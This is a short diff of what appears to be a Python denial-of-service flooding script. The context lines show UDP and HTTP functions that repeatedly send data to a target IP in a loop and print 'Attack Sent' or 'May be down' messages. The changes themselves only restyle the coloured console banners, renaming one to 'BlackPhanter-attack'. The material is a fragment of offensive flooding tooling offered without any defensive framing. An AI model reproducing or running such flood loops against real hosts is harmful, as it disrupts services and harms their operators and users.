@@ -108,7 +108,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print("[*]  \033[96mUDP  \033[92mAttack Sent   \033[33m" +ip+ "\033[0m")
+			print("[*]  \033[96mUDP  \033[92mBlackPhanter-\033[93mattack Sent   \033[33m" +ip+ "\033[0m")
 		except:
 			s.close()
 			print("[-]  \033[31mMay be down\033[0m")
@@ -123,7 +123,7 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print("[#]  \033[32mHTTP   \033[95mLocked :::...\033[94m" +ip+ "\033[0m")
+			print("[#]  \033[97m——————————————————————————————————————————————————————————————————————\033[0m")
 		except:
 			s.close()
 			print("[-]  \033[31mMay be down\033[0m")
